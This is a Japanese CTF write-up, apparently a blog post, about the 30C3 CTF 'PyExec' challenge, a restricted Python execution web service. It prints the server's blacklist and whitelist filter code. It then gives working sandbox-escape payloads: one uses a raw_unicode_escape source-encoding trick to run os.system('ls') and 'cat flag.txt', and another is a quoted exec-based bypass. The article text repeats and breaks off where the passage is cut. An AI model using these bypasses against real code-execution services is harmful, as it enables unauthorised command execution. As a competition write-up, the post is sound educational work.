{"context": " More than 1 year has passed since last update.\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6280\u8853\u3092\u7af6\u3046 CTF (Capture The Flag: \u65d7\u53d6\u308a) \u5927\u4f1a\u306f\u3001\u30d5\u30e9\u30b0(\u65d7)\u6587\u5b57\u5217\u304c\u96a0\u3055\u308c\u305f\u30d7\u30ed\u30b0\u30e9\u30e0\u3084Web\u30b5\u30fc\u30d0\u3084\u753b\u50cf\u306a\u3069\u304c\u51fa\u984c\u3055\u308c\u3001\u30d5\u30e9\u30b0\u3092\u63a2\u3057\u51fa\u3057\u3066\u63d0\u51fa(submit)\u3059\u308b\u3068\u5f97\u70b9\u3068\u306a\u308a\u3001\u7dcf\u5408\u5f97\u70b9\u3092\u7af6\u3046\u5927\u4f1a\u3067\u3059\u3002\u5927\u62b5\u306f\u8907\u6570\u4eba\u3067\u30c1\u30fc\u30e0\u3092\u7d44\u3093\u3067\u53c2\u52a0\u3057\u307e\u3059\u3002\nCTF\u5927\u4f1a\u306b\u306f\u3001\u5927\u4f1a\u4f1a\u5834\u306b\u96c6\u307e\u3063\u3066\u884c\u308f\u308c\u308b\u30aa\u30d5\u30e9\u30a4\u30f3\u5927\u4f1a\u3068\u3001\u4e16\u754c\u5404\u5730\u304b\u3089\u53c2\u52a0\u3067\u304d\u308b\u30aa\u30f3\u30e9\u30a4\u30f3\u5927\u4f1a\u304c\u3042\u308a\u307e\u3059\u3002\u30aa\u30f3\u30e9\u30a4\u30f3\u5927\u4f1a\u3067\u4e88\u9078\u3092\u884c\u3044\u3001\u4e88\u9078\u3092\u52dd\u3061\u629c\u3044\u305f\u30c1\u30fc\u30e0\u304c\u958b\u50ac\u5730\u306b\u96c6\u307e\u3063\u3066\u30aa\u30d5\u30e9\u30a4\u30f3\u5927\u4f1a\u3067\u672c\u6226(\u6c7a\u52dd\u6226)\u3092\u884c\u3046\u3053\u3068\u3042\u308a\u307e\u3059\u3002\n\u6628\u5e74\u672b\u3001\u65e5\u672c\u6642\u95932013\u5e7412\u670828\u65e504:00\uff5e30\u65e504:00(48\u6642\u9593)\u3067\u958b\u50ac\u3055\u308c\u305f 30C3 CTF \u3068\u3044\u3046\u30aa\u30f3\u30e9\u30a4\u30f3\u4e88\u9078\u5927\u4f1a\u306b\u3001 PyExec \u3068\u3044\u3046 python\u306e\u4f7f\u7528\u6587\u5b57\u3092\u5236\u9650\u3057\u305fWeb\u554f\u984c\u304c\u51fa\u984c\u3055\u308c\u3066\u9762\u767d\u304b\u3063\u305f\u306e\u3067\u7d39\u4ecb\u3057\u307e\u3059\u3002\n30C3 CTF (\u30c9\u30a4\u30c4): https://30c3ctf.aachen.ccc.de/\nPyExec \u3067\u306f\u3001Web\u30b5\u30fc\u30d0\u306eURL\u3068\u3001Web\u30b5\u30fc\u30d0\u30d7\u30ed\u30b0\u30e9\u30e0\u306ePython\u30b9\u30af\u30ea\u30d7\u30c8 webapp.py \u304c\u4e0e\u3048\u3089\u308c\u307e\u3057\u305f\u3002\nWeb\u30b5\u30fc\u30d0\u306f2014\u5e741\u67081\u65e5\u6642\u70b9\u3067\u307e\u3060\u52d5\u4f5c\u3057\u3066\u3044\u307e\u3059\u304c\u3001\u8fd1\u3044\u3046\u3061\u306b\u9589\u9396\u3055\u308c\u308b\u3068\u601d\u3044\u307e\u3059\u3002\nWeb\u30b5\u30fc\u30d0\u306eURL: http: //88.198.89.213:8080/ (\u9589\u9396\u3055\u308c\u3066\u307e\u3057\u305f)\nWeb\u30b5\u30fc\u30d0\u306ePython\u30b9\u30af\u30ea\u30d7\u30c8: webapp.py\n\nwebapp.py\n#!/usr/bin/env python\n\nimport json\nimport re\nimport threading\nimport tempfile\nimport tornado.ioloop\nimport tornado.web\nfrom subprocess import Popen, PIPE\n\n\ndef check(data):\n    blacklist = [\n        'UnicodeDecodeError', 'intern', 'FloatingPointError', 'UserWarning',\n        'PendingDeprecationWarning', 'any', 'EOFError', 'next', 'AttributeError',\n        'ArithmeticError', 'UnicodeEncodeError', 'get_ipython', 'import', 'bin', 'map',\n        'bytearray', '__name__', 'SystemError', 'set', 'NameError', 'Exception',\n        'ImportError', 'basestring', 'GeneratorExit', 'float', 'BaseException',\n        'IOError', 'id', 'hex', 'input', 'reversed', 'RuntimeWarning', '__package__',\n        'del', 'yield', 'ReferenceError', 'chr', '__doc__', 'setattr',\n        'KeyboardInterrupt', '__IPYTHON__', '__debug__', 'from', 'IndexError',\n        'coerce', 'False', 'eval', 'repr', 'LookupError', 'file', 'MemoryError',\n        'None', 'SyntaxWarning', 'max', 'list', 'pow', 'callable', 'len',\n        'NotImplementedError', 'BufferError', '__import__', 'FutureWarning', 'buffer',\n        'def', 'unichr', 'vars', 'globals', 'xrange', 'ImportWarning', 'dreload',\n        'issubclass', 'exec', 'UnicodeError', 'raw_input', 'isinstance', 'finally',\n        'Ellipsis', 'DeprecationWarning', 'return', 'OSError', 'complex', 'locals',\n        'format', 'super', 'ValueError', 'reload', 'round', 'object', 'StopIteration',\n        'ZeroDivisionError', 'memoryview', 'enumerate', 'slice', 'delattr',\n        'AssertionError', 'EnvironmentError', 'property', 'zip', 'apply', 'long',\n        'except', 'lambda', 'filter', 'assert', 'copyright', 'bool', 'BytesWarning',\n        'getattr', 'dict', 'type', 'oct', '__IPYTHON__active', 'NotImplemented',\n        'iter', 'hasattr', 'UnicodeTranslateError', 'bytes', 'abs', 'credits', 'min',\n        'TypeError', 'execfile', 'SyntaxError', 'classmethod', 'cmp', 'tuple',\n        'compile', 'try', 'all', 'open', 'divmod', 'staticmethod', 'license', 'raise',\n        'Warning', 'frozenset', 'global', 'StandardError', 'IndentationError',\n        'reduce', 'range', 'hash', 'KeyError', 'help', 'SystemExit', 'dir', 'ord',\n        'True', 'UnboundLocalError', 'UnicodeWarning', 'TabError', 'RuntimeError',\n        'sorted', 'sum', 'class', 'OverflowError'\n    ]\n    for entry in blacklist:\n        if entry in data:\n            return False\n    whitelist = re.compile(\"^[\\r\\na-z0-9#\\t,+*/:%><= _\\\\\\-]*$\", re.DOTALL)\n    return bool(whitelist.match(data))\n\n\nclass ProcessHandler(threading.Thread):\n    def ready(self):\n        if self.timeout:\n            self.request.write(json.dumps({\n                \"error\": \"timeout\"\n            }))\n        else:\n            self.request.write(json.dumps({\n                \"stdout\": self.stdout,\n                \"stderr\": self.stderr,\n            }))\n        self.request.finish()\n\n    def run(self):\n        self.stdout = self.stderr = \"\"\n        self.timeout = False\n        def proc_thread():\n            proc.wait()\n            self.stdout = proc.stdout.read()\n            self.stderr = proc.stderr.read()\n            tornado.ioloop.IOLoop.instance().add_callback(self.ready)\n        _, tmpfile = tempfile.mkstemp()\n        with open(tmpfile, \"w\") as fileobj:\n            fileobj.write(self.code)\n        proc = Popen([\"/usr/bin/python\", tmpfile], stdout=PIPE, stderr=PIPE)\n        t = threading.Thread(target=proc_thread)\n        t.start()\n        t.join(2)\n        if proc.poll() is None:\n            self.timeout = True\n            proc.kill()\n\nclass ExecHandler(tornado.web.RequestHandler):\n    @tornado.web.asynchronous\n    def post(self):\n        self.set_header('Content-Type', \"application/json\")\n        code = self.get_argument(\"code\")\n        if check(code):\n            t = ProcessHandler()\n            t.code = code\n            t.request = self\n            t.daemon = True\n            t.start()\n        else:\n            self.write(json.dumps({\"error\": \"forbidden\"}))\n            self.finish()\n\ndef main():\n    app = tornado.web.Application([\n        (r\"/exec\", ExecHandler),\n        (r\"/\", tornado.web.RedirectHandler, {\"url\": \"/index.html\"}),\n        (r\"/(.*)\", tornado.web.StaticFileHandler, {'path': \"static/\"})\n    ])\n    app.listen(8080)\n    tornado.ioloop.IOLoop.instance().start()\n\nif __name__ == \"__main__\":\n    main()\n\n\n\u307e\u305a\u306fWeb\u30b5\u30fc\u30d0\u30fc\u306ePython\u30b9\u30af\u30ea\u30d7\u30c8\u3092\u773a\u3081\u3066\u307f\u308b\u3068\u3001\"^[\\r\\na-z0-9#\\t,+/:%><= _\\-]$\" \u306e\u6b63\u898f\u8868\u73fe\u306b\u5408\u81f4\u3059\u308b\u6587\u5b57\u300c\u6539\u884c\u6587\u5b57 a\uff5ez 0\uff5e9 # \u30bf\u30d6\u6587\u5b57 , + * / : % > < = _ \u30d0\u30c3\u30af\u30b9\u30b9\u30e9\u30c3\u30b7\u30e5\u6587\u5b57 - \u300d\u3057\u304b\u4f7f\u3048\u305a\u3001\u3055\u3089\u306b blacklist \u306b\u66f8\u304b\u308c\u3066\u308b\u6587\u5b57\u5217\u304c\u4f7f\u3048\u307e\u305b\u3093\u3002\n\u305d\u308c\u3089\u306e\u6761\u4ef6\u306b\u5408\u81f4\u3059\u308b\u5165\u529b\u6587\u5b57\u5217\u3067\u3042\u308c\u3070\u3001\u30d5\u30a1\u30a4\u30eb\u306b\u4fdd\u5b58\u3055\u308c\u3066 /usr/bin/python \u30b3\u30de\u30f3\u30c9\u3067\u5b9f\u884c\u3055\u308c\u307e\u3059\u3002\n\u3053\u306ePython\u30b9\u30af\u30ea\u30d7\u30c8\u306b\u306f\u30d5\u30e9\u30b0\u3089\u3057\u304d\u6587\u5b57\u5217\u304c\u306a\u3044\u306e\u3067\u3001Web\u30b5\u30fc\u30d0\u306e\u4e2d\u3092\u63a2\u3059\u3053\u3068\u306b\u306a\u308a\u305d\u3046\u3067\u3059\u3002\u305d\u306e\u305f\u3081\u306b\u306f import os ; os.system('ls') \u306a\u3069\u3067\u30b5\u30fc\u30d0\u306e\u4e2d\u3092\u8abf\u3079\u308b\u30b3\u30de\u30f3\u30c9\u3092\u5b9f\u884c\u3059\u308b\u5fc5\u8981\u304c\u3042\u308b\u306e\u3067\u3059\u304c\u3001import \u3068\u3044\u3046\u6587\u5b57\u5217\u3084 \u62ec\u5f27 ( ) [ ] \u3084 \u30c9\u30c3\u30c8 . \u306e\u6587\u5b57\u304c\u4f7f\u3048\u306a\u3044\u306e\u3067\u3001\u95a2\u6570\u547c\u3073\u51fa\u3057\u3084\u30e1\u30bd\u30c3\u30c9\u547c\u3073\u51fa\u3057\u304c\u4f7f\u3048\u307e\u305b\u3093\u3002\n\u3055\u3066\u3069\u3046\u3057\u305f\u3082\u306e\u304b\u3068\u8003\u3048\u3066\u3044\u305f\u3089\u3001\u5148\u65e5\u52c9\u5f37\u4f1a\u7528\u306b\u4f5c\u3063\u305f\u300cCTF\u306e\u305f\u3081\u306ePython\u5165\u9580\u300d http://www.slideshare.net/shiracamus/ctfpython \u306b\u3001\u4f59\u8ac7\u3068\u3057\u3066 coding:rot13 \u3092\u7d39\u4ecb\u3057\u3066\u3044\u305f\u3053\u3068\u3092\u601d\u3044\u51fa\u3057\u307e\u3057\u305f\u3002\u3053\u308c\u306e\u5143\u30cd\u30bf\u306f Hidden features of Python \u306e ROT13 Encoding \u3067\u3059\u3002\nhttp://stackoverflow.com/questions/101268/hidden-features-of-python#1024693\ncoding:rot13 \u3092\u4f7f\u3048\u3070\u3001import\u3068\u3044\u3046\u6587\u5b57\u5217\u3092\u5225\u306e\u6587\u5b57\u5217\u3067\u6307\u5b9a\u3067\u304d\u3066 import \u3067\u304d\u306a\u3044\u554f\u984c\u306f\u89e3\u6c7a\u3067\u304d\u307e\u3059\u3002\u3067\u3082\u3001\u62ec\u5f27\u3084\u30c9\u30c3\u30c8\u304c\u4f7f\u3048\u306a\u3044\u554f\u984c\u304c\u6b8b\u308a\u307e\u3059\u3002\nrot13\u4ee5\u5916\u306ecording\u304c\u4f7f\u3048\u306a\u3044\u304b\u8abf\u3079\u3066\u307f\u305f\u3068\u3053\u308d\u3001Python\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u306b\u66f8\u3044\u3066\u3042\u308b\u6a19\u6e96\u30a8\u30f3\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u306e\u3046\u3061\u3001\u300c\u88ab\u6f14\u7b97\u5b50\u306e\u578b\u300d\u304c\u300cUnicode string\u300d\u306e\u3082\u306e\u304c\u4f7f\u3048\u308b\u3088\u3046\u3067\u3059\u3002\nhttp://docs.python.jp/2/library/codecs.html#standard-encodings\n\u305d\u308c\u3092CTF\u30c1\u30fc\u30e0\u30e1\u30a4\u30c8\u306b\u7d39\u4ecb\u3057\u305f\u3068\u3053\u308d\u3001coding:raw_unicode_escape \u3067\u30d5\u30e9\u30b0\u304c\u53d6\u308c\u305f!! \u3068\u306e\u5409\u5831\u304c\u5c4a\u304d\u307e\u3057\u305f\u3002\n\u79c1\u3082\u305d\u308c\u3092\u4f7f\u3063\u3066 os.system('ls') \u3092\u5b9f\u884c\u3057\u3066\u307f\u307e\u3057\u305f\u3002import \u306f\u4f7f\u3048\u306a\u3044\u3051\u3069\u3001\u5148\u982d\u306e i \u3092 \\u0069 \u306b\u3059\u308b\u306a\u3069\u3057\u3066\u56de\u907f\u3057\u3001\u8a18\u53f7\u3082 \\u???? \u3067\u56de\u907f\u3067\u304d\u307e\u3059\u3002\n\nls\n#coding:raw_unicode_escape\n\\u0069mport os\nos\\u002esystem\\u0028\\u0027ls\\u0027\\u0029\n\n\n\nls\u51fa\u529b\u7d50\u679c\nflag.txt\nstatic\nwebapp.py\n\n\nflag.txt \u3068\u3044\u3046\u30d5\u30a1\u30a4\u30eb\u304c\u3042\u308b\u3053\u3068\u304c\u308f\u304b\u3063\u305f\u306e\u3067\u3001os.system(\"cat flag.txt\") \u3092\u5b9f\u884c\u3057\u3066\u307f\u307e\u3059\u3002\n\ncat\u3000flag.txt\n#coding:raw_unicode_escape\n\\u0069mport os\nos\\u002esystem\\u0028\\u0027cat flag\\u002etxt\\u0027\\u0029\n\n\n\ncat\u3000flag.txt\u51fa\u529b\u7d50\u679c\n30C3_2a2766d9cf4a137d517a8227bd71d59d\n\n\n30C3_2a2766d9cf4a137d517a8227bd71d59d \u3092 submit \u3057\u3066 300\u70b9 \u3092\u5f97\u70b9\u3067\u304d\u307e\u3057\u305f\u3002\nCTF\u5927\u4f1a\u304c\u7d42\u308f\u308b\u3068\u3001\u5404\u30c1\u30fc\u30e0\u304c\u3069\u3046\u3084\u3063\u3066\u89e3\u3044\u305f\u304b\u3092Writeup\u3068\u3057\u3066\u516c\u958b\u3059\u308b\u306e\u304c\u98a8\u7fd2\u306b\u306a\u3063\u3066\u3044\u308b\u306e\u3067\u3059\u304c\u3001\u305d\u306e\u4e2d\u306b coding:rot13 \u3067\u89e3\u3044\u3066\u308b\u30c1\u30fc\u30e0\u304c\u3042\u308a\u3001\u305d\u306e\u624b\u6cd5\u3092\u307f\u3066\u66f4\u306b\u52c9\u5f37\u306b\u306a\u308a\u307e\u3057\u305f\u3002\nstring\u30e2\u30b8\u30e5\u30fc\u30eb\u3067\u5b9a\u7fa9\u3055\u308c\u3066\u3044\u308b\u7279\u6b8a\u6587\u5b57\u5217punctuation\u3092\u5909\u6570\u306b\u5c55\u958b\u3057\u3066\u3001\u6587\u5b57\u5217\u9023\u7d50\u3057\u3066\u5b9f\u884c\u3057\u305f\u3044\u6587\u5b57\u5217\u3092\u4f5c\u308a\u51fa\u3057\u3001 exec \u3067\u5b9f\u884c\u3059\u308b\u3068\u3044\u3046\u65b9\u6cd5\u3067\u3057\u305f\u3002\nhttp://rocco.io/ctf/2013/12/29/30C3-CTF-PyExec-300.html\n\ncoding\nfrom os import listdir\nfrom string import lowercase, punctuation, whitespace\n\na, b, c, d, e, f, g, h, i, j,\\\nk, l, m, n, o, p, q, r, s, t,\\\nu, v, w, x, y, z = lowercase\n\n_, _, _, _, _, _, _,\\\nlparen, rparen,\\\n_, _, _, _,\\\ndot,\\\n_, _, _, _,\\\neq,\\\n_, _, _, _, _, _, _, _, _, _, _, _, _ = punctuation\n\n_, _, _, _, _, space = whitespace\n\n# lst = listdir(dot)\nexec  l + s + t + eq +\\\n      l + i + s + t + d + i + r +\\\n      lparen + d + o + t + rparen\n\n_, flag, _, _, _, _, _, _, _ = lst\n\n# print open(flag).read()\nexec  p + r + i + n + t + space +\\\n      o + p + e + n +\\\n      lparen + f + l + a + g + rparen +\\\n      dot + r + e + a + d + lparen + rparen\n\n\n\u4ed6\u306b\u3001coding:unicode_escape \u3067\u89e3\u3044\u3066\u308b\u30c1\u30fc\u30e0\u3082\u3042\u308a\u307e\u3057\u305f\u3002unicode_escape \u3060\u3068 \\x?? \u5f62\u5f0f\u3067\u6307\u5b9a\u3067\u304d\u308b\u3093\u3067\u3059\u306d\u3002\nhttp://delimitry.blogspot.ru/2013/12/30c3-ctf-2013-sandbox-300-pyexec-writeup.html\nCTF\u5927\u4f1a\u958b\u50ac\u60c5\u5831\u3092\u307e\u3068\u3081\u305f\u308a\u3001\u53c2\u52a0\u30c1\u30fc\u30e0\u306e\u4e16\u754c\u30e9\u30f3\u30ad\u30f3\u30b0\u3092\u4ed8\u3051\u3066\u3044\u308b\u30b5\u30a4\u30c8\u3082\u3042\u308a\u307e\u3059\u306e\u3067\u3001\u8208\u5473\u3092\u6301\u3063\u305f\u65b9\u306fJeopardy(\u30d1\u30cd\u30eb\u30af\u30a4\u30ba)\u5f62\u5f0f\u306e\u30aa\u30f3\u30e9\u30a4\u30f3\u5927\u4f1a\u306b\u6311\u6226\u3057\u3066\u307f\u3066\u306f\u3044\u304b\u304c\u3067\u3057\u3087\u3046\u304b\u3002\nRate:10\uff5e20\u306e\u5927\u4f1a\u304c\u521d\u5fc3\u8005\u5411\u3051\u3067\u3059\u300230C3 CTF \u306f Rate:50 \u3067\u96e3\u3057\u304b\u3063\u305f\u3067\u3059\u3002Rate:60\u4ee5\u4e0a\u306f\u304b\u306a\u308a\u96e3\u3057\u3044\u3068\u601d\u3044\u307e\u3059\u3002\nhttps://ctftime.org/event/list/upcoming\n\u65e5\u672c\u3067\u3082\u3001\u4eca\u6708\u672b(2014\u5e741\u670825\u65e5(\u571f)12:00\uff5e26\u65e5(\u65e5)12:00\u306e24\u6642\u9593)\u306bSECCON\u306eCTF\u30aa\u30f3\u30e9\u30a4\u30f3\u4e88\u9078\u304c\u3042\u308a\u307e\u3059\u306e\u3067\u3001\u8208\u5473\u3092\u6301\u3063\u305f\u65b9\u306f\u53c2\u52a0\u3057\u3066\u307f\u3066\u306f\u3044\u304b\u304c\u3067\u3057\u3087\u3046\u304b\u3002\u5236\u9650\u3055\u308c\u305fPython\u30a4\u30f3\u30bf\u30fc\u30d7\u30ea\u30bf\u3092\u653b\u7565\u3059\u308b\u554f\u984c\u306f\u51fa\u306a\u3055\u305d\u3046\u3067\u3059\u304c\u2026\nhttp://2013.seccon.jp/online-quals2013.html\n\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6280\u8853\u3092\u7af6\u3046 CTF (Capture The Flag: \u65d7\u53d6\u308a) \u5927\u4f1a\u306f\u3001\u30d5\u30e9\u30b0(\u65d7)\u6587\u5b57\u5217\u304c\u96a0\u3055\u308c\u305f\u30d7\u30ed\u30b0\u30e9\u30e0\u3084Web\u30b5\u30fc\u30d0\u3084\u753b\u50cf\u306a\u3069\u304c\u51fa\u984c\u3055\u308c\u3001\u30d5\u30e9\u30b0\u3092\u63a2\u3057\u51fa\u3057\u3066\u63d0\u51fa(submit)\u3059\u308b\u3068\u5f97\u70b9\u3068\u306a\u308a\u3001\u7dcf\u5408\u5f97\u70b9\u3092\u7af6\u3046\u5927\u4f1a\u3067\u3059\u3002\u5927\u62b5\u306f\u8907\u6570\u4eba\u3067\u30c1\u30fc\u30e0\u3092\u7d44\u3093\u3067\u53c2\u52a0\u3057\u307e\u3059\u3002\nCTF\u5927\u4f1a\u306b\u306f\u3001\u5927\u4f1a\u4f1a\u5834\u306b\u96c6\u307e\u3063\u3066\u884c\u308f\u308c\u308b\u30aa\u30d5\u30e9\u30a4\u30f3\u5927\u4f1a\u3068\u3001\u4e16\u754c\u5404\u5730\u304b\u3089\u53c2\u52a0\u3067\u304d\u308b\u30aa\u30f3\u30e9\u30a4\u30f3\u5927\u4f1a\u304c\u3042\u308a\u307e\u3059\u3002\u30aa\u30f3\u30e9\u30a4\u30f3\u5927\u4f1a\u3067\u4e88\u9078\u3092\u884c\u3044\u3001\u4e88\u9078\u3092\u52dd\u3061\u629c\u3044\u305f\u30c1\u30fc\u30e0\u304c\u958b\u50ac\u5730\u306b\u96c6\u307e\u3063\u3066\u30aa\u30d5\u30e9\u30a4\u30f3\u5927\u4f1a\u3067\u672c\u6226(\u6c7a\u52dd\u6226)\u3092\u884c\u3046\u3053\u3068\u3042\u308a\u307e\u3059\u3002\n\n\u6628\u5e74\u672b\u3001\u65e5\u672c\u6642\u95932013\u5e7412\u670828\u65e504:00\uff5e30\u65e504:00(48\u6642\u9593)\u3067\u958b\u50ac\u3055\u308c\u305f 30C3 CTF \u3068\u3044\u3046\u30aa\u30f3\u30e9\u30a4\u30f3\u4e88\u9078\u5927\u4f1a\u306b\u3001 PyExec \u3068\u3044\u3046 python\u306e\u4f7f\u7528\u6587\u5b57\u3092\u5236\u9650\u3057\u305fWeb\u554f\u984c\u304c\u51fa\u984c\u3055\u308c\u3066\u9762\u767d\u304b\u3063\u305f\u306e\u3067\u7d39\u4ecb\u3057\u307e\u3059\u3002\n30C3 CTF (\u30c9\u30a4\u30c4): https://30c3ctf.aachen.ccc.de/\n\nPyExec \u3067\u306f\u3001Web\u30b5\u30fc\u30d0\u306eURL\u3068\u3001Web\u30b5\u30fc\u30d0\u30d7\u30ed\u30b0\u30e9\u30e0\u306ePython\u30b9\u30af\u30ea\u30d7\u30c8 webapp.py \u304c\u4e0e\u3048\u3089\u308c\u307e\u3057\u305f\u3002\nWeb\u30b5\u30fc\u30d0\u306f2014\u5e741\u67081\u65e5\u6642\u70b9\u3067\u307e\u3060\u52d5\u4f5c\u3057\u3066\u3044\u307e\u3059\u304c\u3001\u8fd1\u3044\u3046\u3061\u306b\u9589\u9396\u3055\u308c\u308b\u3068\u601d\u3044\u307e\u3059\u3002\nWeb\u30b5\u30fc\u30d0\u306eURL: <del>http: //88.198.89.213:8080/</del> (\u9589\u9396\u3055\u308c\u3066\u307e\u3057\u305f)\nWeb\u30b5\u30fc\u30d0\u306ePython\u30b9\u30af\u30ea\u30d7\u30c8: webapp.py\n\n```py:webapp.py\n#!/usr/bin/env python\n\nimport json\nimport re\nimport threading\nimport tempfile\nimport tornado.ioloop\nimport tornado.web\nfrom subprocess import Popen, PIPE\n\n\ndef check(data):\n    blacklist = [\n        'UnicodeDecodeError', 'intern', 'FloatingPointError', 'UserWarning',\n        'PendingDeprecationWarning', 'any', 'EOFError', 'next', 'AttributeError',\n        'ArithmeticError', 'UnicodeEncodeError', 'get_ipython', 'import', 'bin', 'map',\n        'bytearray', '__name__', 'SystemError', 'set', 'NameError', 'Exception',\n        'ImportError', 'basestring', 'GeneratorExit', 'float', 'BaseException',\n        'IOError', 'id', 'hex', 'input', 'reversed', 'RuntimeWarning', '__package__',\n        'del', 'yield', 'ReferenceError', 'chr', '__doc__', 'setattr',\n        'KeyboardInterrupt', '__IPYTHON__', '__debug__', 'from', 'IndexError',\n        'coerce', 'False', 'eval', 'repr', 'LookupError', 'file', 'MemoryError',\n        'None', 'SyntaxWarning', 'max', 'list', 'pow', 'callable', 'len',\n        'NotImplementedError', 'BufferError', '__import__', 'FutureWarning', 'buffer',\n        'def', 'unichr', 'vars', 'globals', 'xrange', 'ImportWarning', 'dreload',\n        'issubclass', 'exec', 'UnicodeError', 'raw_input', 'isinstance', 'finally',\n        'Ellipsis', 'DeprecationWarning', 'return', 'OSError', 'complex', 'locals',\n        'format', 'super', 'ValueError', 'reload', 'round', 'object', 'StopIteration',\n        'ZeroDivisionError', 'memoryview', 'enumerate', 'slice', 'delattr',\n        'AssertionError', 'EnvironmentError', 'property', 'zip', 'apply', 'long',\n        'except', 'lambda', 'filter', 'assert', 'copyright', 'bool', 'BytesWarning',\n        'getattr', 'dict', 'type', 'oct', '__IPYTHON__active', 'NotImplemented',\n        'iter', 'hasattr', 'UnicodeTranslateError', 'bytes', 'abs', 'credits', 'min',\n        'TypeError', 'execfile', 'SyntaxError', 'classmethod', 'cmp', 'tuple',\n        'compile', 'try', 'all', 'open', 'divmod', 'staticmethod', 'license', 'raise',\n        'Warning', 'frozenset', 'global', 'StandardError', 'IndentationError',\n        'reduce', 'range', 'hash', 'KeyError', 'help', 'SystemExit', 'dir', 'ord',\n        'True', 'UnboundLocalError', 'UnicodeWarning', 'TabError', 'RuntimeError',\n        'sorted', 'sum', 'class', 'OverflowError'\n    ]\n    for entry in blacklist:\n        if entry in data:\n            return False\n    whitelist = re.compile(\"^[\\r\\na-z0-9#\\t,+*/:%><= _\\\\\\-]*$\", re.DOTALL)\n    return bool(whitelist.match(data))\n\n\nclass ProcessHandler(threading.Thread):\n    def ready(self):\n        if self.timeout:\n            self.request.write(json.dumps({\n                \"error\": \"timeout\"\n            }))\n        else:\n            self.request.write(json.dumps({\n                \"stdout\": self.stdout,\n                \"stderr\": self.stderr,\n            }))\n        self.request.finish()\n\n    def run(self):\n        self.stdout = self.stderr = \"\"\n        self.timeout = False\n        def proc_thread():\n            proc.wait()\n            self.stdout = proc.stdout.read()\n            self.stderr = proc.stderr.read()\n            tornado.ioloop.IOLoop.instance().add_callback(self.ready)\n        _, tmpfile = tempfile.mkstemp()\n        with open(tmpfile, \"w\") as fileobj:\n            fileobj.write(self.code)\n        proc = Popen([\"/usr/bin/python\", tmpfile], stdout=PIPE, stderr=PIPE)\n        t = threading.Thread(target=proc_thread)\n        t.start()\n        t.join(2)\n        if proc.poll() is None:\n            self.timeout = True\n            proc.kill()\n\nclass ExecHandler(tornado.web.RequestHandler):\n    @tornado.web.asynchronous\n    def post(self):\n        self.set_header('Content-Type', \"application/json\")\n        code = self.get_argument(\"code\")\n        if check(code):\n            t = ProcessHandler()\n            t.code = code\n            t.request = self\n            t.daemon = True\n            t.start()\n        else:\n            self.write(json.dumps({\"error\": \"forbidden\"}))\n            self.finish()\n\ndef main():\n    app = tornado.web.Application([\n        (r\"/exec\", ExecHandler),\n        (r\"/\", tornado.web.RedirectHandler, {\"url\": \"/index.html\"}),\n        (r\"/(.*)\", tornado.web.StaticFileHandler, {'path': \"static/\"})\n    ])\n    app.listen(8080)\n    tornado.ioloop.IOLoop.instance().start()\n\nif __name__ == \"__main__\":\n    main()\n```\n\n\u307e\u305a\u306fWeb\u30b5\u30fc\u30d0\u30fc\u306ePython\u30b9\u30af\u30ea\u30d7\u30c8\u3092\u773a\u3081\u3066\u307f\u308b\u3068\u3001\"^[\\r\\na-z0-9#\\t,+*/:%><= _\\\\\\-]*$\" \u306e\u6b63\u898f\u8868\u73fe\u306b\u5408\u81f4\u3059\u308b\u6587\u5b57\u300c\u6539\u884c\u6587\u5b57 a\uff5ez 0\uff5e9 # \u30bf\u30d6\u6587\u5b57 , + * / : % > < = _ \u30d0\u30c3\u30af\u30b9\u30b9\u30e9\u30c3\u30b7\u30e5\u6587\u5b57 - \u300d\u3057\u304b\u4f7f\u3048\u305a\u3001\u3055\u3089\u306b blacklist \u306b\u66f8\u304b\u308c\u3066\u308b\u6587\u5b57\u5217\u304c\u4f7f\u3048\u307e\u305b\u3093\u3002\n\u305d\u308c\u3089\u306e\u6761\u4ef6\u306b\u5408\u81f4\u3059\u308b\u5165\u529b\u6587\u5b57\u5217\u3067\u3042\u308c\u3070\u3001\u30d5\u30a1\u30a4\u30eb\u306b\u4fdd\u5b58\u3055\u308c\u3066 /usr/bin/python \u30b3\u30de\u30f3\u30c9\u3067\u5b9f\u884c\u3055\u308c\u307e\u3059\u3002\n\n\u3053\u306ePython\u30b9\u30af\u30ea\u30d7\u30c8\u306b\u306f\u30d5\u30e9\u30b0\u3089\u3057\u304d\u6587\u5b57\u5217\u304c\u306a\u3044\u306e\u3067\u3001Web\u30b5\u30fc\u30d0\u306e\u4e2d\u3092\u63a2\u3059\u3053\u3068\u306b\u306a\u308a\u305d\u3046\u3067\u3059\u3002\u305d\u306e\u305f\u3081\u306b\u306f import os ; os.system('ls') \u306a\u3069\u3067\u30b5\u30fc\u30d0\u306e\u4e2d\u3092\u8abf\u3079\u308b\u30b3\u30de\u30f3\u30c9\u3092\u5b9f\u884c\u3059\u308b\u5fc5\u8981\u304c\u3042\u308b\u306e\u3067\u3059\u304c\u3001import \u3068\u3044\u3046\u6587\u5b57\u5217\u3084 \u62ec\u5f27 ( ) [ ] \u3084 \u30c9\u30c3\u30c8 . \u306e\u6587\u5b57\u304c\u4f7f\u3048\u306a\u3044\u306e\u3067\u3001\u95a2\u6570\u547c\u3073\u51fa\u3057\u3084\u30e1\u30bd\u30c3\u30c9\u547c\u3073\u51fa\u3057\u304c\u4f7f\u3048\u307e\u305b\u3093\u3002\n\u3055\u3066\u3069\u3046\u3057\u305f\u3082\u306e\u304b\u3068\u8003\u3048\u3066\u3044\u305f\u3089\u3001\u5148\u65e5\u52c9\u5f37\u4f1a\u7528\u306b\u4f5c\u3063\u305f\u300cCTF\u306e\u305f\u3081\u306ePython\u5165\u9580\u300d http://www.slideshare.net/shiracamus/ctfpython \u306b\u3001\u4f59\u8ac7\u3068\u3057\u3066 coding:rot13 \u3092\u7d39\u4ecb\u3057\u3066\u3044\u305f\u3053\u3068\u3092\u601d\u3044\u51fa\u3057\u307e\u3057\u305f\u3002\u3053\u308c\u306e\u5143\u30cd\u30bf\u306f Hidden features of Python \u306e ROT13 Encoding \u3067\u3059\u3002\nhttp://stackoverflow.com/questions/101268/hidden-features-of-python#1024693\ncoding:rot13 \u3092\u4f7f\u3048\u3070\u3001import\u3068\u3044\u3046\u6587\u5b57\u5217\u3092\u5225\u306e\u6587\u5b57\u5217\u3067\u6307\u5b9a\u3067\u304d\u3066 import 